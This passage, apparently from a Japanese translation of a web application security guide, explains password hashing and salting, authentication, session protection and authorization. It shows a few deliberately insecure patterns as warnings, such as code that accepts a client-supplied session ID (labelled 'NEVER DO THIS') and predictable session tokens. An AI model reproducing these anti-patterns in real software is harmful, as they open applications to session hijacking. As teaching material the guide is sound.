これは動くでしょうか。正しいユーザーを入れ、未登録ユーザーを締め出せるでしょうか。はい。しかし、だからこそ非常に悪い考えです。

安全でないパスワード保存は、内部者と外部者の両方からリスクを生みます。前者では、アプリケーション開発者や DBA のように上の `application_user` テーブルを読める内部者が、全ユーザーの資格情報へアクセスできるようになります。見落とされがちなリスクとして、内部者がアプリケーション内でユーザーになりすませることがあります。たとえそのシナリオが大きな懸念でなくても、適切な暗号学的保護なしにユーザーの資格情報を保存すると、あなたのアプリケーションとはまったく関係のない、新しい攻撃ベクトルをユーザーに対して導入してしまいます。

そうでなければよいのですが、実際にはユーザーは資格情報を再利用します。誰かが、銀行ログインで使っているのと同じメールアドレスとパスワードで、猫写真にキャプションを付けるサイトへ初めて登録した瞬間、低リスクに見えた資格情報データベースは金融資格情報を保存する媒体になります。不正な従業員や外部ハッカーが資格情報データを盗めば、大手銀行サイトへのログインを試し、同じ資格情報を使ってしまった一人を見つけるまで試行できます。そしてそのユーザーの口座から資金が抜かれたなら、少なくとも一部はあなたにも責任があります。

残る選択肢は二つです。資格情報を安全に保存するか、そもそも保存しないかです。

#### I Can Hash Passwordz

サイトにログインを作る道を選んだなら、二つ目の選択肢はおそらく使えません。したがって一つ目、資格情報を安全に保存する道に進むことになります。

まず、保存すべきなのはパスワードそのものではなく、パスワードのハッシュです。暗号学的ハッシュアルゴリズムは、入力から出力への一方向変換であり、元の入力を実用上復元不能にします。たとえばパスワードが `littlegreenjedi` だとします。ソルト `12345678` と既定のコマンドラインオプションで Argon2 を適用すると、16 進のハッシュ結果が得られます。これで保存しているのはパスワードではなくハッシュです。ユーザーのパスワードを検証するには、送られてきたパスワード文字列に同じハッシュアルゴリズムを適用し、一致すれば有効だと分かります。

では終わりでしょうか。そうではありません。問題は、ソルトを変えない限り、`littlegreenjedi` というパスワードを持つすべてのユーザーがデータベース内で同じハッシュを持つことです。多くの人は同じ古いパスワードを再利用します。よく使われるパスワードとその変形から生成されたルックアップテーブルを使えば、ハッシュ化されたパスワードを効率的に逆算できます。攻撃者がパスワードストアを手に入れれば、ルックアップテーブルとパスワードハッシュを照合するだけで、短時間に多くの資格情報を抽出できる可能性が高いのです。

コツは、パスワードハッシュへ少し予測不能性を加え、簡単に逆算できないようにすることです。適切に生成されたソルトは、まさにそれを提供します。

#### A Dash of Salt

ソルトとは、ハッシュ化の前にパスワードへ追加される追加データです。同じパスワードの二つのインスタンスが同じハッシュ値にならないようにします。本当の利点は、あるパスワードが取り得るハッシュの範囲を、事前計算が実用的でないところまで広げることです。突然、`littlegreenjedi` のハッシュは予測できなくなります。異なるソルトを使えば、同じパスワードでも異なるハッシュになります。攻撃者がパスワードハッシュストアを手に入れても、総当たりのコストはずっと高くなります。

ソルトは、暗号化や難読化のような特別な保護を必要としません。ハッシュの横に置いてもよいですし、bcrypt のようにハッシュへエンコードされていても構いません。パスワードテーブルやファイルが攻撃者の手に渡っても、ソルトへのアクセスは、ハッシュ群に対するルックアップテーブル攻撃には役立ちません。

ソルトはユーザーごとにグローバルに一意であるべきです。OWASP は可能なら 32 または 64 ビットのソルトを推奨し、NIST は少なくとも 128 ビットを要求します。UUID は確実に機能し、おそらく過剰ではありますが、生成は一般に容易です。ハッシュ化とソルト付けは良い出発点ですが、後で見るように、それでも十分でない場合があります。

#### Use A Hash That's Worth Its Salt

残念ながら、すべてのハッシュアルゴリズムが同じように作られているわけではありません。SHA-1 と MD5 は長い間一般的な標準でしたが、低コストの衝突攻撃が発見されました。幸い、衝突が少なく、遅い代替手段はたくさんあります。そう、遅いことが重要です。遅いアルゴリズムは、総当たり攻撃に時間がかかり、したがって実行コストが高くなることを意味します。

広く利用可能な最良のアルゴリズムは、現在 scrypt と bcrypt だと考えられています。現代的な SHA アルゴリズムや PBKDF2 は GPU を使った攻撃への耐性が低いため、長期的な戦略としてはあまり優れていないかもしれません。技術的には Argon2、scrypt、bcrypt、PBKDF2 は、キー・ストレッチング技術を使う鍵導出関数ですが、ここではハッシュを作る仕組みとして考えれば十分です。

##### About Argon2

2015 年 7 月、Argon2 は Password Hashing Competition の勝者として発表されました。いくつかの言語向けのバインディングがあります。Argon2 はパスワードのハッシュ化を目的として設計され、GPU やその他の専用ハードウェアを使う攻撃に耐性があります。ただし非常に新しく、まだ広く採用されているわけではありません。採用がどのように進むか、実装がより広く利用可能になる時期に注意してください。

適切なアルゴリズムを選ぶことに加えて、正しく設定する必要があります。鍵導出関数には、ワークファクターとも呼ばれる反復回数の設定があります。ハードウェアが高速化するにつれ、総当たりにかかる時間を増やせます。将来に備えるなら、ハッシュとソルトに加えて、設定パラメータもパスワード保存に含められます。そうすれば、ワークファクターを増やしたくなったとき、既存ユーザーを壊したり一度に移行したりせずに済みます。アルゴリズム名も保存しておけば、複数を同時にサポートし、弱くなったアルゴリズムからより強いものへ進化できます。

#### Once More with Hashing

先ほどのコードからの変更は、本質的には平文パスワードではなく、ソルト、ハッシュ、ワークファクターを保存することだけです。ユーザーが初めてパスワードを選ぶときにソルトを生成し、それでパスワードをハッシュします。ログイン試行時には、同じソルトを使ってハッシュを生成し、保存済みハッシュと比較します。

```python
def login(conn, email, password):
      result = conn.cursor().execute(
            "SELECT hash_and_salt FROM application_user WHERE email_address = ?",
            [email])
      user = result.fetchone()
      if user is not None:
            hashed = user[0].encode("utf-8")
            return is_hash_match(password, hashed)
      return False
```

この例では Python の bcrypt ライブラリを使っており、ソルトとワークファクターをハッシュ内に保存してくれます。すべてのライブラリがこのように動くわけではありません。生のハッシュだけを出力し、ソルトとワークファクターを別に保存しなければならないものもあります。しかし結果は同じです。ソルトとワークファクターでハッシュを導出し、パスワード作成時に生成されたものと一致することを確認します。

#### Final Tips

ここまでの助言は、自分が制御するサービスのパスワードを保存する場合だけに当てはまります。別システムへアクセスするためにユーザーの代わりにパスワードを保存しているなら、仕事はかなり難しくなります。ハッシュではなくパスワードそのものを保存せざるを得ないからです。理想的には、相手側が SAML、OAuth、またはこの状況に適した同様の仕組みをサポートしているべきです。そうでなければ、どのように保存し、どこへ保存し、誰がアクセスできるのかを非常に慎重に考える必要があります。

多くのサイトは、パスワードの長さに不合理な制限を設けています。ハッシュ化とソルト付けを正しく行っていても、パスワード長の上限が小さすぎたり、許可文字集合が狭すぎたりすると、可能なパスワード数を大幅に減らし、総当たりされる確率を高めます。最終的な目標は長さではなくエントロピーです。しかし、ユーザーがどのようにパスワードを生成するかを効果的に強制することはできないため、少なくとも次のようにするとよいでしょう。

- 英数字と記号を含む 12 文字以上。
- 最大長は 100 文字のように十分長くする。OWASP は、極端に長いパスワードによるサービス拒否攻撃への脆弱性を避けるため、最大 160 文字程度で上限を設けることを推奨している。
- パスワードマネージャーを使う。
- 長いパスワードをランダム生成する。
- 他サイトでパスワードを再利用しない。
- パスワード欄への貼り付けを妨げない。多くのパスワードマネージャーを使えなくしてしまう。

セキュリティ要件が非常に厳しいなら、パスワード戦略を超えて、二要素認証のような仕組みを検討するべきです。パスワードにセキュリティを過度に依存しないためです。

#### In Summary

- すべてのパスワードをハッシュ化し、ソルトを付ける。
- 安全で十分に遅いと認められているアルゴリズムを使う。
- 理想的には、パスワード保存の仕組みを進化できるよう設定可能にする。
- 外部システムや外部サービスのパスワード保存は避ける。
- 小さすぎるパスワード長制限や狭すぎる文字集合制限を設けないよう注意する。

### Authenticate Users Safely

特定のコンテンツを誰に届けるかを制御するなど、ユーザーの同一性を知る必要があるなら、何らかの認証を提供する必要があります。ユーザーが認証された後、リクエスト間でそのユーザーに関する情報を保持したいなら、セッション管理も必要になります。この二つの関心事はよく知られており、多くのフル機能フレームワークでサポートされていますが、誤って実装されることが十分に多いため、OWASP Top 10 の第 2 位に入るほどです。

認証は、認可と混同されることがあります。認証は、ユーザーが名乗る本人であることを確認します。認可は、そのユーザーが何かをしてよいかを定義します。セッション管理は、認証と認可をつなぎます。特定ユーザーによるリクエスト同士を関連づけられるようにするものです。セッション管理がなければ、ユーザーは Web アプリケーションへ送るすべてのリクエストで認証しなければなりません。認証、認可、セッション管理の三つは、人間のユーザーにもサービスにも適用されます。これら三つをソフトウェアの中で分けておくと、複雑さが減り、したがってリスクも減ります。

認証には多くの方法があります。どの方法を選ぶにせよ、必要な機能を提供する既存の成熟したフレームワークを探すのが賢明です。そうしたフレームワークは長い時間をかけて精査されていることが多く、一般的な間違いの多くを避けています。ありがたいことに、他の有用な機能も付いていることがよくあります。

最初から考えるべき全体的な関心事は、クライアントがネットワーク越しに資格情報を送るとき、それをどう秘密に保つかです。これを実現する最も簡単で、おそらく唯一の方法は、前に述べた「すべてに HTTPS を使う」という助言に従うことです。

HTTP プロトコルで指定された単純なチャレンジレスポンス機構を使う選択肢もあります。ブラウザがリソースへのチャレンジ情報を含む 401 Unauthorized レスポンスに遭遇すると、名前とパスワードを入力するウィンドウを表示し、以後のリクエストのためにそれらをメモリに保持します。この仕組みには弱点があり、最も深刻なのは、ユーザーがログアウトする唯一の方法がブラウザを閉じることだという点です。

より安全な選択肢は、Web フォームから資格情報を入力させ、認証後のユーザーセッションのライフサイクルを管理できるようにすることです。これは、データベーステーブルでユーザー名を検索し、先に説明したパスワードハッシュの方法でパスワードのハッシュを比較するだけの単純なものにもできます。

#### Understand Your Options

ユーザー名とパスワードによる認証は多くのシステムでうまく機能しますが、唯一の選択肢ではありません。ユーザーがすでにアカウントを持っている外部サービスプロバイダーに同一性確認を任せることもできます。また、パスワードや PIN のような「知っているもの」、携帯電話やキーフォブのような「持っているもの」、指紋のような「本人であるもの」など、さまざまな要素でユーザーを認証できます。必要に応じて、これらの選択肢は検討に値しますし、追加の保護層を加えたいときにも役立ちます。

多くのユーザーに便利な選択肢のひとつは、Facebook、Google、Twitter のような一般的なサービスの既存アカウントを使ってログインできるようにすることです。これは Single Sign-On、SSO と呼ばれます。SSO では、ユーザーは ID プロバイダーが管理する単一の同一性を使って、異なるシステムへログインできます。ユーザーはあなたのサイトへ資格情報を渡しません。

SSO はサイト登録にかかる時間を大きく減らし、ユーザーがさらに別のユーザー名とパスワードを覚える必要をなくします。一方で、サイト利用を私的に保ち、他所の同一性と結びつけたくないユーザーもいます。対応する外部プロバイダーのアカウントを持たないユーザーもいます。手動で情報を入力して登録できる選択肢も残すのが望ましいでしょう。

ユーザー名とパスワードのような単一要素の認証だけでは、ユーザーを守るのに足りないことがあります。他の認証要素を使うと、パスワードが侵害された場合にもユーザーを守る追加層を加えられます。二要素認証では、ユーザーの同一性を確認するために、第二の異なる認証要素が必要になります。第一要素がユーザー名とパスワードのような「知っているもの」なら、第二要素は携帯電話上のソフトウェアやハードウェアトークンが生成する秘密コードのような「持っているもの」になり得ます。SMS テキストメッセージで送られる秘密コードの検証はかつて一般的でしたが、さまざまなリスクがあるため現在は非推奨です。

#### Reauthenticate For Important Actions

認証が重要なのはログイン時だけではありません。パスワード変更や送金のような機密性の高い操作をユーザーが行うとき、追加の保護として再認証を使えます。これは、ユーザーアカウントが侵害された場合の露出を制限する助けになります。たとえば一部のオンライン販売業者は、新しく追加した配送先へ購入するとき、クレジットカードの詳細を再入力させます。個人情報を更新するときにパスワードを再入力させるのも有用です。

#### Conceal Whether Users Exist

ユーザーがユーザー名やパスワードの入力を間違えたとき、「ユーザー ID が不明です」のような応答をするサイトがあります。ユーザーが存在するかどうかを明かすと、攻撃者がシステム上のアカウントを列挙し、それに対してさらなる攻撃を行う助けになります。サイトの性質によっては、そのユーザーがアカウントを持っていること自体がプライバシー侵害になる場合もあります。よりよい一般的な応答は、「ユーザー ID またはパスワードが正しくありません」です。

この助言はログイン時だけに当てはまるものではありません。アカウント登録やパスワードリセットなど、Web アプリケーションの多くの機能を通じてユーザーは列挙され得ます。このリスクを意識し、不要な情報を開示しないようにするのがよいでしょう。

#### Preventing Brute Force Attacks

攻撃者は、動作するものが見つかるまでアカウントのパスワードを推測する総当たり攻撃を試みるかもしれません。攻撃者が侵害済みシステムの大規模ネットワーク、つまりボットネットを使って攻撃することが増えている中、サービス継続性に影響を与えずに効果的な防御策を見つけるのは難しい課題です。

良い出発点は、一定回数のログイン失敗後にユーザーを一時的にロックアウトすることです。これはアカウント侵害のリスクを下げますが、攻撃者が悪用してユーザーをロックアウトし、サービス拒否状態を引き起こせるという意図しない効果もあります。管理者が手動でロック解除しなければならないなら、サービスに深刻な混乱をもたらすこともあります。それでも攻撃者を困難にし、多くを思いとどまらせます。10 秒から 60 秒程度の短いロックアウトは、可用性リスクを同じほど課さずに有効な抑止になり得ます。

もうひとつの一般的な選択肢は CAPTCHA です。これは人間には解けるがコンピュータには解けない課題を提示することで、自動攻撃を抑止しようとします。しばしば、人間にもコンピュータにも解けない課題に見えることがあります。CAPTCHA は有効な戦略の一部になり得ますが、効果は下がっており批判もあります。コンピュータがより高い精度で課題を解けるようになり、人間の作業者に解かせることも安価になりました。また、視覚や聴覚に障害のある人に問題をもたらす可能性もあり、アクセシブルなサイトを望むなら重要な考慮点です。

これらの選択肢を重ねることは、頻繁な総当たり攻撃を受けるサイトで有効な戦略として使われてきました。たとえば、あるアカウントで二回ログインに失敗したら CAPTCHA を提示し、さらに数回失敗したら一時的にロックアウトします。その失敗列が再び繰り返されるなら、今度はアカウント所有者へ秘密リンクでロック解除を求めるメールを送り、再度ロックするのが理にかなうかもしれません。

#### Don’t Use Default Or Hard-Coded Credentials

推測しやすい既定の資格情報を持つソフトウェアを出荷することは、ユーザーとアプリケーションの双方に大きなリスクをもたらします。ユーザーに便利さを提供しているように見えるかもしれませんが、実際にはまったく逆です。ルーターや IoT デバイスのような組み込みシステムでよく見られ、ネットワークへ接続された瞬間に簡単な標的になります。よりよい選択肢は、一意のワンタイムパスワードを入力させてから変更を強制すること、あるいはパスワードが設定されるまで外部からアクセスできないようにすることです。

開発やデバッグ目的で、ハードコードされた資格情報がアプリケーションへ追加されることもあります。これは同じ理由でリスクをもたらし、出荷前に忘れられるかもしれません。さらに悪いことに、ユーザーがその資格情報を変更または無効化できない場合もあります。ソフトウェアに資格情報をハードコードしてはいけません。

#### In Summary

- 可能な限り、自作ではなく既存の認証フレームワークを使う。
- ニーズに合った認証方式をサポートする。
- 攻撃者がアカウントを乗っ取れる可能性を制限する。
- アカウントの特定や侵害を狙う攻撃を防ぐ手段を取れる。
- 既定またはハードコードされた資格情報を絶対に使わない。

### Protect User Sessions

HTTP はステートレスなプロトコルなので、リクエスト間でユーザーデータを関連づける組み込みの仕組みを持ちません。この目的で、匿名ユーザーにも認証済みユーザーにもセッション管理がよく使われます。前に述べたように、セッション管理は人間のユーザーにもサービスにも適用されます。

セッションは攻撃者にとって魅力的な標的です。攻撃者がセッション管理を破って認証済みセッションを乗っ取れれば、実質的に認証を完全に迂回できます。さらに悪いことに、セッションが誤った手に渡りやすくなる形でセッション管理が実装されているのをよく見かけます。では、正しく行うにはどうすればよいのでしょうか。

認証と同じく、セッション管理もゼロから自作するのではなく、既存の成熟したフレームワークを使い、ニーズに合わせて調整するのが望ましいです。その重要性を理解するために、セッション管理の一般的な問題を見ていきます。問題は大きく、セッション識別子生成の弱さと、セッションライフサイクルの弱さに分かれます。

#### Generate Safe Session Identifiers

セッションは通常、ユーザーのブラウザが以後のリクエストで送る Cookie の中にセッション識別子を設定することで作られます。これらの識別子の安全性は、予測不能で、一意で、秘密であることに依存します。攻撃者が推測または観測によってセッション識別子を得られるなら、ユーザーのセッションを乗っ取れます。

識別子の安全性は、予測可能な値を使うことで簡単に損なわれます。独自実装ではかなりよく見られます。たとえば次のような Cookie があるとします。

```text
Set-Cookie: sessionId=NzU4NjUtMTQ2Nzg3NTIyNzA1MjkxMg
```

攻撃者がさらに何度かログインし、`sessionId` Cookie の値の列を観測すると、それが base64 エンコードされていることに気づき、デコードして値を見られるかもしれません。

```text
75865-1467875227052912
75884-1467875229845186
75892-1467875235408139
```

このトークンが、おそらくシーケンス番号とマイクロ秒単位の現在時刻という二つの値で構成されていると気づくのに、大した推測は要りません。この種の識別子は、攻撃者が少し努力するだけで推測し、セッションを乗っ取れます。現在時刻やユーザーの IP アドレスのような予測可能な入力からトークンを導出するだけでは、この目的には不十分です。

攻撃者がトークンを推測する可能性を大きく下げるため、OWASP の Session Management Cheat Sheet は、安全な疑似乱数生成器で生成された 128 ビット、つまり 16 バイト以上のセッション識別子を推奨しています。Java や Ruby には、`/dev/urandom` のようなソースから疑似乱数を得る `SecureRandom` というクラスがあります。

一部のセッション管理実装では、ユーザー情報をデータストアで検索するコストをなくすため、ユーザーに関する情報を Cookie 自体に入れます。データの機密性、完全性、真正性を保証する暗号アルゴリズムを慎重に使わない限り、これはさらに多くの問題を引き起こします。原則として、Cookie 内に送る情報は絶対に必要なものへ制限してください。暗号化している場合でも、ユーザーの個人識別情報や秘密情報を保存してはいけません。ユーザー名、ロール、権限レベルのような情報を含めるなら、攻撃者がデータを改ざんして認可を迂回したり他ユーザーのアカウントを乗っ取ったりするリスクから守る必要があります。

#### Don't Expose Session Identifiers

HTTPS は、ネットワークトラフィックの盗聴によるセッション識別子の窃取を防ぐ助けになります。しかし、セッション識別子は他の方法で意図せず漏れることがあります。典型例として、航空会社の顧客が検索結果ページへのリンクを友人に送るケースがあります。そのリンクに顧客のセッション識別子を含むパラメータが入っていると、友人が突然その顧客として航空券を予約できてしまいます。

言うまでもなく、セッション識別子を URL に露出させるのは危険です。上の例のように知らずに第三者へ送られるかもしれませんし、ユーザーが外部サイトへのリンクをクリックしたときに `Referer` ヘッダーで露出するかもしれませんし、サイトのログに記録されるかもしれません。この目的では Cookie のほうがよい選択です。どの方法を選ぶにせよ、セッション識別子が URL、ログ、リファラー、あるいは攻撃者がアクセスできる場所に露出しないようにしてください。

#### Protect Your Cookies

Cookie をセッションに使う場合、意図せず露出しないよう簡単な予防策を取るべきです。この目的で理解しておくべき重要な属性は、`Domain`、`Path`、`HttpOnly`、`Secure` の四つです。

`Domain` は Cookie の範囲を特定のドメインとサブドメインへ制限し、`Path` はさらにパスとそのサブパスへ制限します。どちらの属性も、明示的に設定しなければかなり制限的な値になります。`Domain` を緩い値に設定するのは危険です。たとえば `payments.martinfowler.com` で支払いをしているときに `Domain` を `martinfowler.com` に設定すると、その Cookie は以後 `martinfowler.com` とすべてのサブドメインへ送られます。すべてのサブドメインとそのセキュリティを制御していないなら、攻撃者が Cookie を捕まえる助けになりかねません。

`Path` 属性もできるだけ制限的に設定すべきです。セッション識別子が `/login` 後の `/secret/` パスとそのサブパスへアクセスするときだけ必要なら、`/secret/` に設定するのがよい考えです。

`Secure` と `HttpOnly` は Cookie の使われ方を制御します。`Secure` フラグは、HTTPS 使用時だけ Cookie を送るようブラウザへ示します。`HttpOnly` フラグは、Cookie が JavaScript や他のクライアントサイドスクリプトからアクセスできないようブラウザへ指示し、悪意あるコードに盗まれるのを防ぐ助けになります。

```text
Set-Cookie: sessionId=[top secret value]; path=/secret/; secure; HttpOnly;
  domain=payments.martinfowler.com
```

この結果、クライアントスクリプトからのアクセスが無効で、`https://payments.martinfowler.com/secret/` 以下へのリクエストだけで利用可能な Cookie になります。Cookie の範囲を制限することで、攻撃面はずっと小さくなります。

#### Managing the Session Lifecycle

セッションのライフサイクルを適切に管理すると、侵害されるリスクを減らせます。セッションをどう管理するかはニーズによります。銀行のセッションライフサイクルは、猫写真にキャプションを付けるサイトとはかなり違うでしょう。

ユーザーがサイトへ最初にリクエストしたときにセッションを始めてもよいですし、認証されるまで待ってもよいでしょう。どちらを選んでも、セッションの権限レベルが変わるときにはリスクがあります。攻撃者が、Cookie や隠しフォームフィールドなどで、ユーザーのセッション識別子を攻撃者が知っている低権限セッションへ設定できたらどうなるでしょうか。攻撃者がユーザーをだましてログインさせられれば、突然より高い権限のセッションを支配できます。これは **session fixation** と呼ばれる攻撃です。避けるためにできることは二つあります。第一に、ユーザーが認証するか権限レベルを上げるたび、新しいセッションを必ず作ること。第二に、セッション識別子は自分たちでだけ作り、妥当でない識別子は無視することです。

```java
// pseudocode. NEVER DO THIS
if (!isValid(sessionId)) {
    session = createSession(sessionId);
}
```

セッションが長く有効であるほど、攻撃者がそれを手に入れる可能性は高くなります。そのリスクを下げ、セッションテーブルをきれいに保つため、一定時間操作のないセッションにはタイムアウトを課せます。時間の長さはリスク許容度によります。銀行なら、セキュリティ上の予防策として 10 分間の非アクティブでセッションをタイムアウトさせる厳格なポリシーを持つかもしれません。

ユーザーは自分専用ではないコンピュータを使っているかもしれませんし、ログインしたままにしたくないかもしれません。常に、見やすく簡単なログアウト手段を用意してください。ユーザーがログアウトしたときは、過去の日付で期限切れにすることで、ブラウザへセッション Cookie を破棄するよう指示しなければなりません。

最後に、ユーザーが自分の所有しないシステムからログアウトし忘れた場合や、アカウント侵害を疑っている場合に、アクティブなセッションを終了する手段を提供することも検討してください。簡単な方法のひとつは、ユーザーがパスワードを変更したとき、そのユーザーのすべてのセッションを終了することです。アクティブセッション一覧を表示できるようにすることも、リスクを見つける助けになります。

#### Verify It

認証とセッション管理には多くの考慮事項があります。間違いがないことを確認するため、OWASP の ASVS、Application Security Verification Standard を参照すると役立ちます。要件や実装に抜けがないことを確認するうえで非常に価値あるリソースであり、認証とセッション管理にそれぞれ章を割いています。

ASVS は、三つの必要レベルに基づいてセキュリティを提案します。レベル 1 は基本的な脆弱性への防御、レベル 2 は機密データを保持する通常のサイト、レベル 3 は医療や金融サービスのような非常に機密性の高いアプリケーション向けです。この記事で述べる多くの予防策はレベル 2 に合うものです。

#### In Summary

- 自作ではなく既存のセッション管理フレームワークを使う。
- セッション識別子を秘密に保ち、URL やログで使わない。
- 属性を使ってセッション Cookie の範囲を制限し、保護する。
- セッションが存在しないとき、またはユーザーの権限レベルが変わるたびに、新しいセッションを作る。
- 自分で作っていない ID でセッションを作らない。
- ユーザーがログアウトし、既存セッションを終了できる手段を用意する。

### Authorize Actions

認証がユーザーやシステム、時には principal や actor と呼ばれるものの同一性を確立することは説明しました。その同一性が、操作を許可するか拒否するかの評価に使われるまでは、あまり価値がありません。何が許され、何が許されないかを強制するこのプロセスが認可です。認可は一般に、特定のリソースに対して特定のアクションを取る許可として表現されます。リソースとはページ、ファイルシステム上のファイル、REST リソース、あるいはシステム全体でさえあり得ます。

#### Authorize on the Server

プログラマが犯し得る最も重大な間違いのひとつは、サーバー上で明示的に認可を強制するのではなく、機能を隠すだけにすることです。たとえば、管理者でないユーザーから「ユーザー削除」ボタンを単に隠すだけでは不十分です。ユーザーから来るリクエストは信頼できないため、サーバーコードが削除の認可を実行しなければなりません。

さらに、クライアントは認可情報をサーバーへ渡すべきではありません。クライアントが渡してよいのは、セッション ID のように、サーバー側で事前に生成され、推測不能な一時的な同一性情報だけです。サーバーは、明示的に検証できない限り、クライアントからの同一性、権限、ロールに関するものを信頼してはいけません。

#### Deny by Default

この記事の前半で、正の検証、つまりホワイトリストの価値について話しました。同じ原則は認可にも当てはまります。認可機構は、明示的に許可されていない限り、常に既定でアクションを拒否すべきです。同様に、認可が必要なアクションと不要なアクションが混在するなら、既定で拒否し、権限が不要なアクションだけを上書きするほうがずっと安全です。安全な既定値は、特定のアクションに対する権限指定を忘れたときに起こり得る被害を制限します。

#### Authorize Actions on Resources

一般に、二種類の認可要件に出会います。グローバル権限とリソースレベル権限です。グローバル権限は、暗黙のシステムリソースを持つものと考えられます。しかし、グローバル権限とリソース権限では、実装の詳細が異なりがちです。

グローバル権限のリソースは暗黙的、あるいは存在しないと言えるため、実装は単純になりがちです。たとえばサーバーをシャットダウンする権限チェックを追加するなら、次のようにできます。

```java
public OperationResult shutdown(final User callingUser) {
    if (callingUser != null && callingUser.hasPermission(Permission.SHUTDOWN)) {
        doShutdown();
        return SUCCESS;
    } else {
        return PERMISSION_DENIED;
    }
}
```

Spring Security の宣言的機能を使う代替実装は、次のようになります。

```java
@PreAuthorize("hasRole('ROLE_SHUTDOWN')")
public void shutdown() throws AccessDeniedException {
    doShutdown();
}
```

リソース認可は通常もっと複雑です。ある actor が特定のリソースに対して特定のアクションを取れるかを検証するからです。たとえばユーザーは自分自身のプロフィールだけを変更できるべきです。ここでも、影響を受ける特定のリソースに対して呼び出し元がそのアクションを取る権利を持つことを、システムが検証しなければなりません。

リソース認可を支配するルールはドメイン固有であり、実装と保守の両方でかなり複雑になり得ます。既存フレームワークが助けになることもありますが、必要な複雑さを表現できるだけ十分に表現力があり、かつ保守が複雑すぎないことを確認する必要があります。

```java
public OperationResult updateProfile(final UserId profileToUpdateId, final ProfileData newProfileData, final User callingUser) {
    if (isCallerProfileOwner(profileToUpdateId, callingUser)) {
        doUpdateProfile(profileToUpdateId, newProfileData);
        return SUCCESS;
    } else {
        return PERMISSION_DENIED;
    }
}
```

#### Use Policy to Authorize Behavior

根本的には、同一性確認からアクション実行までのプロセス全体は次のように要約できます。

- 匿名の actor が、認証によって既知の principal になる。
- ポリシーが、その principal がリソースに対してアクションを取れるかを決める。
- ポリシーが許可すれば、そのアクションが実行される。

ポリシーは、あるアクションが許可されるかどうかに答えるロジックを含みます。ただし、その判断方法はアプリケーションのニーズによって大きく異なります。

最も一般的な認可の変種は、おそらく role-based access control、RBAC です。名前のとおり、ユーザーにはロールが割り当てられ、ロールには権限が割り当てられます。ユーザーは割り当てられたロールの権限を継承し、アクションは権限に対して検証されます。

この間接化の価値に疑問を持つかもしれません。管理者の Kristen がユーザーを削除でき、他のユーザーはできない、ということだけが重要なら、ユーザー名を直接確認すればよいのではないか、という考えです。

```java
public OperationResult deleteUser(final UserId userId, final User callingUser) {
    if (callingUser != null && callingUser.getUsername().equals("admin_kristen")) {
        doDelete(userId);
        return SUCCESS;
    } else {
        return PERMISSION_DENIED;
    }
}
```

しかし `admin_kristen` が組織を離れたり別の役割へ移ったりしたらどうなるでしょうか。資格情報を共有するか、コード中のすべての `admin_kristen` 参照を新しいユーザーへ変更しなければなりません。前者はもちろん非常に悪い考えです。

一般的な代替はロールを確認することです。

```java
public OperationResult deleteUser(final UserId userId, final User callingUser) {
     if (callingUser != null && callingUser.hasRole(Role.ADMIN)) {
         doDelete(userId);
         return SUCCESS;
     } else {
         return PERMISSION_DENIED;
     }
}
```

こちらのほうがましですが、十分ではありません。アイデンティティをアクションへ結びつけることは避けましたが、ユーザー追加はできるがユーザー削除はできない低い権限の管理者が必要になったら問題が残ります。突然、`admin` ロールは粒度が粗すぎることになり、すべての `admin` チェックを探し、必要なら `user_creator` ロールとの OR 条件を入れることになります。システムが進化するにつれ、条件文は複雑になり、ロール数は爆発します。

ユーザーとロールは、ソフトウェアの進化とともに変わります。したがって解決策もそれを反映すべきです。ユーザー名やロール名をハードコードする代わりに、長期的には、コードが特定のアクションが許可されているかを検証するようにするのがよいでしょう。このコードは、ユーザーが誰か、どのロールを持つかではなく、何かをする権限を持つかに関心を持つべきです。同一性から権限への対応づけは上流で行えます。

```java
public OperationResult deleteUser(final UserId userId, final User callingUser) {
    if (callingUser != null && callingUser.hasPermission(Permission.DELETE_USER)) {
        doDelete(userId);
        return SUCCESS;
    } else {
        return PERMISSION_DENIED;
    }
}
```

ロールから権限を明示的に分離したことで、構造はずっと良くなりました。ユーザーから権限への対応づけという追加ステップに複雑さはありますが、一般には Spring Security や CanCanCan のようなフレームワークに重い作業を任せられます。

RBAC は、権限が比較的静的で、ポリシー上のロールがドメイン内の役割に自然に対応し、維持しなければならない権限とロールの組み合わせが多すぎず、他の選択肢を使う強い理由がない場合に検討してください。

RBAC で合理的に実装できる範囲を超える高度なニーズがあるなら、attribute-based access control、ABAC を見るとよいかもしれません。ABAC は RBAC の一般化と考えられ、ユーザー、ユーザーが存在する環境、アクセス対象リソースの任意の属性へ拡張されます。

ABAC では、ユーザーにロールが割り当てられているかだけでアクセス制御を判断するのではなく、人事で定義される職位、勤務年数、IP アドレスの国など、ユーザープロフィールの任意のプロパティからロジックを作れます。さらに、時刻やユーザーのロケールにおける祝日かどうかのようなグローバル属性も使えます。

ABAC ポリシーを表す最も一般的な標準化手段は、OASIS による XML ベースの形式である XACML です。XACML には、冗長で暗号的とも言える課題があります。一方で、ABAC ポリシーを定義する標準化されたモデルを使いたいなら、数少ない選択肢のひとつです。別の選択肢は、アプリケーションの言語で、ドメインに結びついたポリシーを構築することです。

小さな DSL で同じポリシーを書くと、たとえば次のようになります。

```javascript
allow('read')
    .of(anyResource())
    .if(and(
        User.department().is(equalTo('development')),
        timeOfDay().isDuring('9:00 PST', '17:00 PST'))
    );
```

ポリシー定義そのもの以外にも、ここにはこの記事の範囲を超える作業がかなりあります。カスタムコードの道を選ぶなら、DSL 自体へどれだけ投資するか、実装を誰が所有するかを考える必要があります。動的なポリシーが多数あるなら、より洗練された DSL に価値があるかもしれません。非プログラマがポリシーを理解する必要がある場合、外部 DSL が正当化されるかもしれません。そうでなければ、範囲が限られポリシーが静的なケースでは、主な保守者であるプログラマにとってポリシーを明確にすることを目標に、単純に始めるのが最善です。

DSL で作ることは必須ではありません。アプリケーションの他の部分と同じオブジェクト指向、関数型、手続き型のコーディングスタイルを使い、強い設計とリファクタリングの実践に頼ってきれいなコードを作れます。

ABAC は、権限が非常に動的で、ユーザーロール変更だけでは保守の大きな頭痛になる場合、権限が依存するプロフィール属性が人事プロフィール管理など別目的ですでに保守されている場合、通常勤務時間かどうかのような時間属性に基づいて制御フローを変える必要があるほどアクセス制御が繊細な場合、またはアプリケーションコードとは独立して管理される非常に細粒度の権限を持つ集中ポリシーが必要な場合に検討してください。

#### Other Ways to Model Policy

ここまでの二つは、ポリシーをモデル化する可能な方法の一部にすぎませんが、たいていの状況に対応できるでしょう。まれではありますが、RBAC や ABAC にうまく収まらない状況もあります。他のアプローチには、Mandatory access control、Relationship-based Access Control、Discretionary Access Control、Rule-based Access Control などがあります。

